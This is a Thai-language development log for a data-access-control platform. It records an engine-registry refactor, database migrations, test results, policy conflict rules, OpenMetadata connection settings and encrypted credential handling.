- `ON DELETE RESTRICT` ไม่ใช่ `CASCADE` — cascade จะลาก credential reference และ enforcement mode ของทุก table ที่ engine นั้นคุ้มครองอยู่ไปด้วย
- **ลบแถว PROXY ทิ้ง 8 แถว** ตามเหตุผลข้อ AR.3 · แถวของโหมด native ยังอยู่ครบ เพราะพวกนั้นเป็นคำพูดเกี่ยวกับ engine จริงๆ และ M5/M6 compiler ต้องใช้ (FR-6.0b)

🐛 **ของที่เจอ:** `engine_capability` มี **25 แถวที่ seed ไว้ตั้งแต่ V4 และไม่มีโค้ด Java อ่านมันเลยสักบรรทัด** — capability matrix ที่ FR-6.0b สัญญาไว้ ฝั่ง backend ยังไม่ได้ต่อ (ฝั่ง frontend มี `enforcement.ts` ที่คำนวณเองอยู่) รอบนี้แก้ไปครึ่งหนึ่ง: แถว PROXY ย้ายเข้าโค้ดแล้วและมีคนอ่านจริง · แถว native ยังรออยู่ที่ M6

### AR.5 `GET /v1/sources/engines` — และ 6 ไฟล์ frontend เลิกพิมพ์ list เอง

endpoint ใหม่ใน `SourceResource` (วางไว้**ก่อน** `@Path("/{id}")` — JAX-RS เลือก literal path ก่อน template อยู่แล้ว แต่เรียงตามลำดับที่อ่านง่ายไว้ด้วย) ตอบ `id` · `displayName` · `defaultPort` · `supportsSchemas` · `proxyCapabilities`
ไม่มี Source row ในคำตอบ → กติกา `redact()` ไม่เกี่ยว

ฝั่ง frontend:

| ไฟล์ | เดิม | ใหม่ |
|---|---|---|
| `src/engines.ts` ⭐ **ใหม่** | — | `useSourceEngines()` (TanStack Query · `staleTime: Infinity` — list เปลี่ยนตอน deploy ไม่ใช่ตอนคนกรอกฟอร์ม) · `engineLabel()` · `enginePort()` · `engineOptions()` |
| `api/sources.ts` | `type SourceEngine = 'POSTGRES' \| 'SQLSERVER'` | `= string` + `SourceEngineInfo` + `fetchEngines()` |
| `SourcesPage.tsx` | `DEFAULT_PORT` table · dropdown 2 ตัวเลือก · badge ternary | อ่านจาก registry ทั้งสามจุด · `BLANK.engine = ''` แล้วเติมด้วยตัวแรกที่ server ส่งมา |
| `pages/home/widgets.tsx` | badge ternary | `engineLabel(engines, source.engine)` |
| `PolicyBuilderPage.tsx` | dropdown 2 ตัวเลือก · `useState<Engine>('POSTGRES')` | `engineOptions(engines)` · `useState<Engine \| null>(null)` แล้วเติมเมื่อ list มาถึง |
| `pages/policies/enforcement.ts` | `Engine = 'POSTGRES' \| 'SQLSERVER'` | `= string` |

🐛 **ของที่เจอระหว่างทาง (คลาสเดียวกับ `dialectFor()` เป๊ะ):** `enforcement.ts` เขียน note ของ NATIVE_CONFIG ว่า

```ts
engine === 'POSTGRES' ? '<ข้อความ Postgres>' : '<ข้อความ SQL Server>'
```

แปลว่า engine ตัวที่สาม**จะได้ประโยคของ SQL Server ไป** — เป็นคำกล่าวอ้างที่เจาะจง มั่นใจ และผิด เกี่ยวกับผลิตภัณฑ์ที่ไม่มีใครเคยตรวจ · รอบนี้เปลี่ยนเป็น `Record<string, string>` + fallback ที่พูดความจริงว่า *"Native column masking on this engine has not been verified"* และรายงานเป็น **gap** ไม่ใช่ปล่อยผ่าน — เพราะ engine ที่เราไม่มีข้อมูลคือ engine ที่เรามั่นใจน้อยที่สุด · ตารางไม่กี่ตัวจะเงียบไม่ได้

**ที่เหลือคำว่า `SQLSERVER` ใน `frontend/app/src` มีแค่ 2 จุด และทั้งคู่ถูกต้อง** — key ของตาราง note (เป็น prose เกี่ยวกับผลิตภัณฑ์นั้นจริงๆ) และ test ที่ assert พฤติกรรมของทั้งสอง engine ที่ ship จริง

### AR.6 เทสต์ที่เพิ่ม — 606 → 662 (backend) · 161 → 162 (frontend)

| ไฟล์ | จำนวน | สิ่งที่มันกัน |
|---|---|---|
| `SourceEngineConformanceTest` (dac-common) | parameterized ทุก engine | id เป็นตัวใหญ่ไม่ว่าง · หาเจอไม่ว่าสะกดยังไง · port อยู่ในช่วง · url มี host/port/database และขึ้นต้น `jdbc:` · **url ที่ database เป็น null ต้องไม่มีคำว่า "null" อยู่ในนั้น** · `JdbcCoordinates` ปฏิเสธ host ว่าง / port 0 / port 70000 |
| `SqlDialectsTest` (dac-compiler-sql) | 7 | ทุก engine ที่ลงทะเบียนมี dialect จริง · **`of("POSTGRES")` ต้องคืนคนละ instance ทุกครั้ง** (dialect ถือ salt ต่อ column ของ HASH — แชร์ instance = hash ของสอง source correlate กันได้ ซึ่งเป็นสิ่งเดียวที่ salt ต่อ column มีไว้กัน) |
| `ProxyCapabilitiesTest` (dac-proxy) | 11 | **การปฏิเสธ** เป็นหลัก — engine ที่ mask ไม่ได้แล้วรัน query ต่อจะคืน column แบบ plaintext และ**ไม่มีใครแจ้งเป็นบั๊กเพราะ query สำเร็จ** · บวก parameterized ว่า engine ที่ ship จริงทั้งคู่พูดได้ครบทุกอย่างที่ rewriter ปล่อยออกมา |
| `JdbcTargetsTest` (dac-connector-source) | 8 | **`Class.forName(driverClassName())` จริง** — driver ที่มีชื่ออยู่ใน constant แต่ไม่มีใน pom จะ register ได้สวยงามแล้วพังตอนต่อครั้งแรก · โมดูลนี้เป็นที่เดียวที่มี driver ทั้งสองบน classpath |
| `SourceEngineRegistryIT` (dac-service, Testcontainers) | 5 | ตาราง `source_engine` กับ registry ในโค้ดพูดตรงกัน · FK ยังปฏิเสธ engine ที่พิมพ์ผิดเหมือนที่ CHECK เคยทำ · ลบ engine ที่ยังมีคนใช้ไม่ได้ · `engine_capability` เหลือ PROXY 0 แถวและ native > 0 |
| `policyLanguage.test.ts` (frontend) | +1 | engine ที่ไม่มี note ต้องรายงานว่า *ยังไม่ได้ตรวจสอบ* และ **ต้องไม่มีคำว่า "SQL Server" อยู่ในคำตอบ** |

### AR.7 การรันจริง — **V18 ถูกรันบน Postgres จริงครั้งแรก และชื่อ constraint ที่เดาไว้ถูก**

`./mvnw -o -am -pl backend/dac-service verify -Pintegration` → **BUILD SUCCESS 03:53 น.** (2026-09-24 16:00)
· unit **662** (dac-common 31 · dac-engine 277 · dac-compiler-sql 34 · dac-connector-openmetadata 91 · dac-connector-source 19 · dac-proxy 30 · dac-service 180)
· integration **160** · `Failures 0 Errors 0 Skipped 0` ทุกโมดูล · ไม่มีบรรทัด `[ERROR]` เลยทั้ง log

**บรรทัดที่ต้องเห็นถึงจะพูดได้ว่าผ่าน** (ตามกับดักที่จดไว้ใน What Didn't Work):

```
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 4.119 s
       -- in com.mfec.dac.source.SourceEngineRegistryIT
```

**สิ่งที่การรันนี้พิสูจน์ ซึ่งก่อนหน้านี้เป็นแค่การอนุมานจากการอ่าน migration เก่า:**

| สมมติฐาน | พิสูจน์ด้วย |
|---|---|
| `ALTER TABLE data_source DROP CONSTRAINT data_source_engine_check` มีตัวตนจริง | Flyway รัน V18 ผ่าน — ถ้าชื่อผิด migration ตายทั้งชุดและ IT ทุกตัวใน `dac-service` จะล้มตาม ไม่ใช่แค่ตัวเดียว |
| `engine_capability_engine_check` เช่นกัน | เหมือนกัน |
| FK ยังกันของที่ CHECK เคยกัน | `theForeignKeyGuardsWhatTheCheckUsedTo` — `INSERT ... engine = 'POSTGRESQL'` ได้ error ที่มีคำว่า `data_source_engine_fkey` |
| `ON DELETE RESTRICT` ไม่ใช่ CASCADE | `deletingAnEngineInUseIsRefused` |
| `DELETE FROM engine_capability WHERE mode = 'PROXY'` ลบครบและไม่ลบเกิน | `theCapabilityTableNoLongerSpeaksForTheProxy` — PROXY = 0 แถว · native > 0 แถว |
| ตารางกับ registry ในโค้ดพูดตรงกัน | `theTableAndTheRegistryAgree` + `theRowMatchesTheEngine` |

> ⚠️ **ทำไมถึงจดข้อนี้แยก:** ชื่อ constraint ที่ PostgreSQL ตั้งให้อัตโนมัติ (`<table>_<column>_check`) เป็นสิ่งที่ **เดาถูกได้ 99% แต่ `DROP CONSTRAINT` ที่ไม่มี `IF EXISTS` จะตายทันทีถ้าเดาผิด** — และมันจะตายบน production ตอน deploy ไม่ใช่ตอน compile เจตนาที่ไม่ใส่ `IF EXISTS` คือ *ถ้า CHECK ไม่อยู่ตรงนั้นแปลว่าเราเข้าใจ schema ผิด อย่าเงียบ* → การรัน IT จึงเป็นเงื่อนไขของการ commit ไม่ใช่ของแถม

---

## รอบก่อนหน้า — **ของที่เคยต้อง redeploy ย้ายมาอยู่บนหน้าจอครบ 3 อย่าง** · **ผู้ช่วย LLM มีประตูเข้าแล้ว** · และ **เอกสารกติกาการชนกันของ policy ที่ผู้ใช้ขอ**

> รอบนี้ยาวและกระจายหลายเรื่อง เพราะผู้ใช้ถามแทรกเป็นระยะ สรุปเป็นข้อๆ ตามลำดับที่ทำ

### AQ.1 เอกสารกติกาการชนกันของ policy — และ **spec เดิมเขียนผิดอยู่สองที่**

ผู้ใช้ถามสามข้อ (อยู่หลาย group / 1 group หลาย data policy / หลาย group หลาย policy จะเอาอันล่าสุดหรือกำหนดลำดับ) แล้วขอให้ **สรุปเป็นตารางไว้อธิบายทีม และใส่ไว้ในเอกสาร**

**คำตอบยืนยันจากโค้ดจริง ไม่ใช่จากความจำ:**

| กติกา | บรรทัดที่เป็นหลักฐาน |
|---|---|
| **ชั้นเดียวกัน = union** (ALLOW ใบเดียวที่ match ก็พอ) | `PolicyEngine.java:443` ใน `hasMatchedAllowAt()` — `if (c.layer() == layer && c.allows() && c.applies()) return true;` |
| **ข้ามชั้น = intersection** และ **ชั้นที่ไม่มี ALLOW เลยไม่นับเป็นด่าน** | `PolicyEngine.java:346-348` — ถ้านับ จะกลายเป็นว่าไม่เขียน policy ระดับ SERVICE แล้วทั้ง estate เข้าไม่ได้ |
| **row filter ทบกัน แล้ว AND** | `DecisionSql.java:155` — `return String.join(" AND ", parts);` (ทั้ง `ViewCompiler` และ `QueryRewriter` เดินผ่านตัวนี้ ซึ่งคือเหตุผลที่ FR-6.0c ทดสอบได้) |
| **mask เข้มสุดชนะ เสมอกันคงของเดิม** | `MaskStrength.java:56` — `return rank(candidate) > rank(incumbent) ? candidate : incumbent;` → **ผลลัพธ์ไม่ขึ้นกับลำดับการ evaluate** |
| **ไม่มี "เอาอันล่าสุด" และไม่มีเลขลำดับอยู่ในโมเดลเลย** | ค้นทั้ง repo แล้วไม่มี |

**ของใหม่: [docs/policy-conflict-resolution.md](docs/policy-conflict-resolution.md)** — ภาษาไทย เขียนให้ **คนเขียน policy ที่ไม่ได้อ่านโค้ด** มีสรุป 5 บรรทัด · ตาราง conflict 12 แถว · ตารางลำดับความเข้มของ mask · ตัวอย่างเต็ม 6 เคส (รวมเคสที่คนพลาดบ่อยที่สุด — เขียน policy ระดับ TABLE เพื่อปลด mask ของ ORG แล้วไม่ติด) · และหัวข้อ "ทำไมไม่ใช้เอาอันล่าสุดหรือตั้งเลขลำดับ"

🐛 **ระหว่างเขียนเจอว่า `docs/policy-spec.md` ผิดอยู่สองที่** (ไม่ใช่บั๊ก runtime แต่ใครอ่านแล้วเชื่อจะเขียน policy ผิด):
1. ตารางลำดับความเข้มของ mask **หล่น `CONDITIONAL` หายไปทั้งตัว** — เขียนแค่ `NULLIFY > CONSTANT > HASH > REGEX_REPLACE > PARTIAL > ROUNDING > plaintext` ทั้งที่ `CONDITIONAL` มี rank 1 อยู่จริง แก้เป็นเขียนเลข rank กำกับครบและบอกว่าเสมอกันคงของเดิม
2. **ไม่เคยเขียนเรื่อง union ภายในชั้นเดียวกันไว้เลย** — ข้อความเดิมอ่านแล้วเข้าใจได้ว่า ALLOW ทุกใบต้องผ่าน ซึ่งตรงข้ามกับที่ engine ทำ

⚠️ **กับดักที่บันทึกไว้ให้เห็น: `CONDITIONAL` rank 1 อยู่ต่ำกว่า mask ธรรมดาทุกตัว** → `ROUNDING` ธรรมดาบน column เดียวกันชนะ cell mask **และเงื่อนไขหายไปทั้งก้อน** กลายเป็น mask แบบไม่มีเงื่อนไข — เขียนเตือนไว้ทั้งในเอกสารไทยและข้างตาราง masking function ใน spec แล้ว และใส่ไว้ใน Next Steps ว่าควรพิจารณาจัด rank ใหม่

### AQ.2 M18 — ตอบคำถาม "ออกแบบให้ต่อได้หลาย database type แล้วหรือยัง"

คำตอบตรงๆ คือ **คำนึงถึงแล้วครึ่งเดียว** — ครึ่งที่แพง (Policy IR / `SqlDialect` / `engine_capability`) ถูกแล้ว ครึ่งที่ถูกกลับกระจายอยู่ **14 จุด** และ 3 ใน 14 นั้นเป็น `switch` ที่ **ลืมแล้วไม่ error ตอน compile** แต่พังตอน runtime ด้วยข้อความที่โกหก

รายละเอียดทั้งหมด + งานที่จะทำ (`SourceEngine` registry) อยู่ที่ **ข้อ AP.7** — และลำดับที่ห้ามสลับคือ **M18 ก่อน M6 และก่อนเพิ่ม engine ตัวที่ 3 เสมอ**

### AQ.3 OpenMetadata connection แก้ได้จากหน้าจอแล้ว (V17)

ผู้ใช้เจอว่า **ปุ่ม "Open in OpenMetadata" กดไม่ได้** แล้วพูดว่า *"จริงๆ ต้องใส่ URL ที่ถูกสิ"* ตามด้วย *"ต้องสามารถแก้ Instance หรือ Credential ได้สิ ทำให้เป็นแบบ configurable"*

เดิม base URL กับ token มาจาก environment ล้วน → ย้ายลง DB:

- **`V17__om_connection.sql`** — ตารางแถวเดียว (`id boolean PRIMARY KEY CHECK (id)`) เก็บ `base_url` + `jwt_token_cipher` + `webhook_secret_cipher` + `expected_version` + `fail_on_version_mismatch` + timeout สองตัว · **ความลับสองตัวถูก Fernet ด้วยกุญแจเดียวกับ credential อื่นทั้งระบบ** · `null` แปลว่า *"ใช้ของจาก environment ต่อไป"* → estate ที่ฉีด token มาทาง deployment ยังทำแบบเดิมได้โดยที่ยังย้าย URL จากหน้าจอได้
- **`OmConnectionStore`** — `current()` / `save(Edit, actor, ip)` / `credentials()` · `Edit` ทุก field เป็น optional และ **field ที่เว้นว่างแปลว่าเก็บของเดิมไว้** บังคับด้วย `COALESCE(:token, om_connection.jwt_token_cipher)` ใน `ON CONFLICT DO UPDATE` ไม่ใช่ `excluded.` — ถ้าใช้ `excluded` การย้าย URL จะลบ token ทิ้งโดยไม่มีใครเชื่อมโยงสองเรื่องนี้เข้าด้วยกันได้
- **`requireUrl()`** ปฏิเสธ: ไม่ใช่ http/https · ไม่มี host · มี `?` หรือ `#` (คือ URL ที่ copy จาก address bar) · และ **ลงท้ายด้วย `/api`** ซึ่งเป็นสิ่งที่คนพลาดบ่อยที่สุดเพราะมันคือ URL ที่อยู่ใน history ของ dev — พลาดแล้วจะได้ 404 ทุกครั้งโดยไม่มีอะไรบอกว่า "URL ผิด" · **ยอมให้ private/loopback** ต่างจาก `LlmGatewayUrl` เพราะนี่คือ catalog ของแพลตฟอร์มเองที่ admin เป็นคนตั้ง ไม่ใช่ address ที่ user พิมพ์เข้ามา
- **`OpenMetadataSettingsResource`** — `@Secured("PLATFORM_ADMIN")` ทั้ง class · `PUT` บันทึกแล้ว **`client.reconfigure(...)` ในคอลเดียวกัน** (setting ที่ต้อง restart คือ setting ที่ดูเหมือนพัง) · `POST /test` **รับ candidate** → ทดสอบ address ใหม่ก่อน save ได้ ด้วย `OpenMetadataClient` ตัวใช้แล้วทิ้ง — reconfigure ตัวจริงเพื่อ probe แปลว่าเอา crawler ไปชี้ instance ที่ยังไม่มีใครตกลง และถ้า probe fail มันจะค้างอยู่ตรงนั้น · candidate ที่ไม่ใส่ token ใช้ token เดิม probe
- **หน้าจอ** — section ใหม่ **"Change the connection"** ใน `OpenMetadataSettingsPage.tsx` (เปิดด้วยปุ่ม Edit) · base URL / expected version / timeout 2 ช่อง / toggle fail-on-mismatch / **bot token + webhook secret เป็น `type="password"` ที่เว้นว่าง = คงของเดิม** / ช่องเหตุผล / ปุ่ม **Test before saving** · **Save** · **Discard**
- **หลังบันทึกจะ invalidate `sync-status` / `vocabulary` / `catalog`** เพราะการย้าย catalog เปลี่ยนความหมายของ asset, tag และ term ทุกตัวที่ค้างอยู่บนจอ

⚠️ **กติกาที่ห้ามถอด** — ความลับ **ไม่เคยถูกส่งกลับ browser ในรูปแบบใดเลย** ไม่ใช่ค่า ไม่ใช่ prefix ไม่ใช่ความยาว · `describe()` ตอบแค่ `tokenConfigured` เป็น boolean · ฝั่ง frontend สัญญาว่า **ช่องความลับที่ไม่ได้แตะต้องส่ง `undefined` ไม่ใช่ `''`** เพราะ `''` อ่านได้ว่า "ล้างทิ้ง" — มีเทสต์ยืนยันข้อนี้โดยเฉพาะ (`OpenMetadataSettingsPage.test.tsx`)

### AQ.4 เวลาของ nightly reconcile ตั้งเองได้ (V15)

*"Schedule Sync อยากให้สามารถกำหนดเวลาเองได้ เห็นตอนนี้ Sync ตอน 02:30 Asia/Bangkok"*

- **`V15__sync_schedule.sql`** — `om_sync_schedule` แถวเดียว เก็บ `enabled` + `run_at time` + `zone` · **เก็บเป็นเวลาท้องถิ่นใน zone ไม่ใช่ UTC** เพราะความหมายของ setting คือ "ตีสองครึ่งที่ data centre" ซึ่ง UTC instant จะเลิกแปลว่าอย่างนั้นทันทีที่เจอ daylight saving · `enabled = false` คือค่าจริง ไม่ใช่แถวที่หายไป — estate ที่ crawl จาก pipeline เองต้องการปิด backstop **อย่างตั้งใจ** ซึ่งต้องแยกจาก "ยังไม่มีใคร config"
- **`NightlyReconcile` อ่านใหม่ก่อนจองทุกครั้ง** → save แล้วขยับรอบ**คืนนี้** ไม่ใช่รอบหน้าสัปดาห์
- **`ScheduleEditor`** ในหน้า OM settings — พิมพ์เวลา + zone (datalist จาก `Intl.supportedValuesOf('timeZone')` แต่พิมพ์เองได้ และ server validate เสมอ) · แสดง **สามเวลา** เพราะมันตอบคนละคำถาม: ค่าที่เก็บ / ค่าที่ไฟล์ service ขอไว้ตอนแรก / **รอบที่จองไว้จริง** — schedule เปิดอยู่ในโปรเซสที่ไม่ได้รัน backstop ได้ และทางเดียวที่จะพูดตรงๆ คือพิมพ์การจองออกมา

### AQ.5 เพิ่ม user attribute จากหน้าจอ ARAK ได้ (V16)

*"อยากให้เพิ่ม User Attribute ได้จากหน้าจอของ Arak เลย"* / *"นอกจาก Sync มาแล้ว ยังสามารถเพิ่มได้ที่ Arak"*

- ตัว storage **ไม่ต้องเปลี่ยนเลย** — `principal_attribute.source` แยก `local` / `entra` / `openmetadata` อยู่แล้ว และ sync เขียนเฉพาะแถวของตัวเอง → **ค่าที่พิมพ์เองจะไม่ถูก sync ทับ และไม่ทับของ sync**
- ที่ต้องแก้คือ **audit** — `audit_identity_change` เดิมบรรยาย role grant อย่างเดียว ไม่มีที่เก็บว่า attribute ไหนค่าอะไร → **`V16__local_attributes.sql`** เพิ่ม `attr_key` / `attr_value` และขยาย action list
- **เก็บ value เต็มโดยตั้งใจ** — *"มีคนแก้ clearance"* ไม่ใช่คำตอบที่ auditor ใช้ได้ *"clearance L3 ถูกเพิ่มให้ analyst_a โดย admin"* ใช่ · ค่าพวกนี้คือ governance label ไม่ใช่ความลับ ความลับคือข้อมูลที่มันไขได้ ซึ่งเป็นเหตุผลที่ label ต้องมีร่องรอย
- `POST` / `DELETE /v1/principals/{id}/attributes` + หน้าจอใน Principal detail

### AQ.6 ผู้ช่วย LLM มีประตูเข้าแล้ว — `AssistDock` + mascot

*"An LLM ไม่เห็นมีอยู่ในหน้า Query หรือสร้าง Policy เลยอะ ตอนที่เปิดแล้ว"* และ *"ตัว mascot ในภาพ mascot.png ทำเป็น mascot วิ่งบนหน้าจอ... หรือจะอยู่มุมขวาเป็น AI Assistance Chatbot"* → ผู้ใช้เลือก *"วางขวา corner เล็กๆ จะขึ้นมาถ้าเรากด"*

- **`frontend/app/src/assist/AssistDock.tsx`** (474 บรรทัด) + `assistStore.ts` — ปุ่มเล็กมุมขวาล่าง **ไม่ทำอะไรเลยจนกว่าจะกด** · **ไม่มี idle animation ไม่มีเด้ง** — console ที่งานคือทำให้คำเตือนสะดุดตา ห้ามมีอย่างอื่นขยับแข่ง
- **mascot 4 ท่าเป็น state ไม่ใช่ของประดับ** (`greet` / `thinking` / `cheer` / `shield`) เปลี่ยนท่าเมื่อ state เปลี่ยนเท่านั้น
- **วาดให้เฉพาะคนที่เปิด assistant ไว้และ gateway ตอบจริง** — โฆษณาฟีเจอร์ที่ยังไม่ได้ config ไม่ใช่ฟีเจอร์
- **`LlmAssistResource`** — `POST /v1/llm/assist/sql` และ `/policy` · **`AssistPrompts` ส่งแต่ metadata ไม่มีค่าข้อมูลจริงสักแถว** บังคับด้วยโครงสร้าง และ assert ด้วย `AssistPromptsTest.carriesNoValues` / `draftsOnly` · **ไม่มี write path ไป activate policy** (FR-2.6 separation of duty) — ผลที่ออกมาเป็น draft ให้คนตรวจเสมอ

### AQ.7 Pager ตัวเดียวใช้ร่วมกัน + หน้า Policies มี paging

*"หน้า policy ทำเป็น paging ด้วยดีไหม จะได้ไม่ยาวเกิน"* และก่อนหน้านั้น *"ความยาวของกรอบแสดงผล Asset ต่อ 1 page ให้เท่ากับที่ filter สิ"*

- **`frontend/app/src/components/Pager.tsx`** — ตัวเดียว ใช้ทั้ง `CatalogPage` และ `PolicyListPage` · การมี pager สองตัวที่หน้าตาเกือบเหมือนกันคือทางที่ทำให้มันค่อยๆ ต่างกัน
- หน้า Policies ได้ทั้ง **ค้นหา** (รอบก่อน) และ **paging** (รอบนี้)

### AQ.8 ชิป `?` กลายเป็นคำว่า `unconfirmed`

ผู้ใช้ชี้ที่ชิปแล้วถามว่า *"อันนี้หมายถึงอะไรนะ เครื่องหมาย ?"* — **การที่ต้องถามคือคำตอบทั้งหมดว่ามันใช้ได้ไหม** `?` ถูกอ่านเป็นปุ่ม help

เปลี่ยนเป็นคำว่า **`unconfirmed`** และ tooltip เขียนว่า *"suggested by OpenMetadata, not confirmed by anyone — no policy enforces on it unless one opts in"* ซึ่งคือสิ่งที่ ARAK ทำจริงตาม FR-1.3a ไม่ใช่การ echo คำว่า `state Suggested` ของ OM ที่ไม่มีความหมายกับคนที่ไม่ได้อ่าน spec

### AQ.9 ซ่อน Enforcement กับ Access ออกจาก rail

*"Hide Tab Enforcement, Access ก่อน เนื่องจากยังไม่เสร็จใช่ไหม เดี๋ยวเสร็จค่อยเอากลับมา"*

`NavSection` ได้ field **`hidden?: boolean`** — ⚠️ **ไม่ใช่ permission** มันซ่อนจากทุกคนรวมทั้ง admin และไม่ได้ปิดกั้นอะไรที่ใครจะเข้าถึงได้อยู่แล้ว · **route ยังอยู่** bookmark หรือลิงก์จากเอกสารยังลงที่ placeholder ที่อธิบายตัวเองได้ ไม่เด้งกลับหน้าแรก

**เอากลับเมื่อไหร่ (เขียนไว้ในโค้ดแล้ว):** Enforcement → พร้อมกับ M5 slice ที่มี apply/rollback · Access → พร้อมกับหน้า overview ของ M8

> ✅ **อัปเดต (ข้อ AW.7): Enforcement กลับมาแล้ว** — มี dry-run / apply / rollback ครบ · **Access ยังซ่อนอยู่** รอ M8

### AQ.10 "Open in OpenMetadata" ต่อถึงของจริง

`OpenMetadataLink` สร้าง URL ของ asset ในคอนโซล OM จาก FQN + entity type แล้วหน้า Asset detail มีปุ่มพาไปตรงหน้านั้น — และนี่คือจุดที่พาไปสู่ AQ.3 ทั้งข้อ เพราะปุ่มนี้จะถูกก็ต่อเมื่อ base URL ถูก

### AQ.11 เทสต์ที่เพิ่มรอบนี้

| ไฟล์ | คุมอะไร |
|---|---|
| `OmConnectionStoreTest` | `requireUrl()` — รับ console root / ตัด trailing slash / **ปฏิเสธ `/api` ทั้งแบบมีและไม่มี slash ปิดท้าย** (เช็คต้องรันหลัง trim) / ปฏิเสธ scheme อื่น / ไม่มี host / มี `?` หรือ `#` / ว่าง |
| `OpenMetadataSettingsPage.test.tsx` | **ช่องความลับที่ไม่ได้แตะส่ง `undefined` ไม่ใช่ `''`** · ช่องที่พิมพ์จริงส่งไป · **Test ยิง address ที่อยู่บนจอ ไม่ใช่ตัวที่ใช้อยู่ และไม่บันทึกอะไร** · Discard คืนค่าที่ server บอก · non-admin ไม่เห็นอะไรเลย |
| `SyncScheduleTest` | เวลาท้องถิ่น + zone + การคำนวณรอบถัดไป |
| `AssistPromptsTest` | **`carriesNoValues`** — prompt ไม่มีค่าข้อมูลจริง · **`draftsOnly`** — ผลลัพธ์เป็น draft เท่านั้น |
| `HomeLayoutValidatorTest` / `HomeLayoutStoreTest` / `HomeLayoutStoreIT` | HTML ที่ผู้ใช้พิมพ์เอง (stored XSS) ถูกล้างทั้งตอนเขียนและตอนอ่าน |
| `CredentialResolverTest` | resolver ที่ไม่มีกุญแจต้องปฏิเสธ ไม่ใช่เงียบ |
| `OpenMetadataLinkTest` | URL ของ asset ใน OM |

## รอบก่อนหน้า — **กลับคำเรื่อง Credential: พิมพ์ username/password ลงหน้าจอได้แล้ว** · **Test connection ก่อน save** · และ **LLM ต่อ per-user สำเร็จจริง (M11 ไม่ใช่ "ยังไม่เริ่ม" อีกแล้ว)**

### AO.1 ผู้ใช้ถามสองข้อที่เป็นเรื่องเดียวกัน

> `Register a source ไม่เห็นมีที่ให้ test Connection ก่อน save`
> `Credential reference คืออะไร ทำไมไม่ให้ใส่ username password ในหน้าจออะ ตอน Register datasource หรือ ตอน LLM`

ข้อแรกเป็นช่องโหว่ของ UX ตรงๆ — backend มี `POST /v1/sources/{id}/test` มาตั้งแต่ต้น แต่มันเทสต์ได้เฉพาะ source ที่ **บันทึกไปแล้ว** คนที่กรอกฟอร์มอยู่จึงต้องเดาว่าพิมพ์ host ถูกไหม กด Register ไปก่อน แล้วค่อยรู้ว่าผิด

ข้อสองใหญ่กว่า และคำตอบเดิมของเราผิด

### AO.2 เหตุผลเดิม และทำไมมันไม่สมเหตุสมผล

กฎเดิมคือ `credential_ref` ต้องเป็น **ตัวชี้** ไปที่ secret store เท่านั้น (`vault://` / `azurekeyvault://` / `env:`) — `DataSourceStore.validate()` ปฏิเสธทุกอย่างที่ไม่ขึ้นต้นด้วยสามอันนี้ เหตุผลที่เขียนไว้ใน class doc คือ *"the moment a console accepts a password in a text box, the password is in the database, the backups and somebody's screen recording"*

ปัญหาคือ **มันไม่ได้ทำให้ password หายไปจากระบบ มันแค่ย้ายที่** ในทางปฏิบัติคนที่ไม่มี Vault ก็ไปใส่ไว้ใน environment variable ของ process ซึ่ง:

- ไม่มี audit trail ว่าใครเปลี่ยนเมื่อไหร่
- เปลี่ยนทีต้อง restart backend
- อยู่ใน `.env` ที่ `docker inspect` / `ps e` อ่านได้
- และคนที่ตั้งมันคือคนเดียวกับที่ตั้ง `FERNET_KEY` อยู่แล้ว

ที่แย่กว่านั้นคือ **product เราเองไม่สอดคล้องกัน** — M11 ให้ผู้ใช้พิมพ์ API key ของ LLM ลงหน้าจอตรงๆ แล้ว seal ด้วย Fernet (`llm_user_setting.api_key_cipher`) แต่ data source กลับบังคับให้ไป env var ทั้งที่ความเสี่ยงของ data source **สูงกว่า** จึงเป็นการเข้มในที่ที่ไม่ได้ช่วย และผ่อนในที่ที่คนใช้งานจริง

**ตัดสินใจ: รับทั้งสองแบบ** ใครมี Vault ก็ยังชี้ `vault://` ได้เหมือนเดิม ใครไม่มีก็พิมพ์ลงหน้าจอได้ โดยมี compensating control ที่ต้องไม่หายไปไหน (AO.3)

### AO.3 ⚠️ กติกาที่ห้ามถอด — ciphertext ต้องไม่ถูกส่งกลับไปที่ browser

ทางเดินของ credential ที่พิมพ์เอง:

```
browser: {username, password}
   │
   ▼ SourceResource.withCredential(...)
SecretBox.seal("user:password")      ← Fernet, key = FERNET_KEY
   │
   ▼
DataSourceStore เห็นแค่  "fernet:<ciphertext>"   ← validate() ยังทำงานเหมือนเดิม
   │                                               แถวใน DB ไม่เคยมี plaintext
   ▼ ทุก response ที่มี Source ผ่าน redact()
browser ได้กลับ          "fernet:stored"          ← ไม่ใช่ ciphertext
```

- **`redact()` ต้องถูกเรียกในทุก endpoint ที่คืน `Source`** — ตอนนี้คือ `list()` / `get()` / `create()` / `update()` / `setEnabled()` ถ้ามี endpoint ใหม่ที่คืน `Source` แล้วลืม redact คือ ciphertext หลุดออก API ทันที
- คำว่า `stored` อยู่ที่เดียวคือ `CredentialResolver.STORED` แล้ว `SourceResource` อ้างค่านั้น เพื่อไม่ให้สองฝั่งเพี้ยนกัน
- `CredentialResolver` **ปฏิเสธ `fernet:stored`** อย่างชัดเจนพร้อมข้อความที่บอกว่าเกิดอะไรขึ้น เพราะถ้าเผลอรับ มันจะกลายเป็น source ที่ต่อด้วย credential ว่างเปล่า
- ฟอร์มแก้ไขส่ง `credentialRef` กลับมาทุกครั้ง → ถ้าส่ง `fernet:stored` มา `withCredential()` จะ **เอา ref เดิมในแถวมาใส่คืน** ไม่ใช่เขียนคำว่า `stored` ทับ ciphertext จริง (บั๊กนี้ถ้าหลุดไป = password หายทั้งชุดตอนคนกด Save โดยไม่ได้แก้อะไรเลย)

### AO.4 🐛 ดักได้ก่อนขึ้น — resolver ที่ไม่มีกุญแจ

ตอนแรก `JdbcIntrospector` กับ `QueryExecutor` ต่างคนต่าง `new CredentialResolver()` ด้วย constructor เปล่า ซึ่ง **ไม่มี opener** แปลว่า:

- `POST /v1/sources/test` เขียว (เพราะ `SourceProbe` ได้ resolver ที่มีกุญแจ)
- แล้ว crawl ไม่ได้ query ไม่ได้ ขึ้นว่า credential ใช้ไม่ได้

คือ source ที่ **เทสต์ผ่านแล้วพังทีหลัง** ซึ่งเป็นอาการที่หาสาเหตุยากที่สุด แก้โดยสร้าง `CredentialResolver` **ตัวเดียว** ใน `DacApplication` แล้วส่งให้ทั้งสามคนใช้ (`JdbcIntrospector` · `SourceProbe` · `QueryExecutor`) และย้าย `SecretBox` ขึ้นไปสร้างก่อน source registry

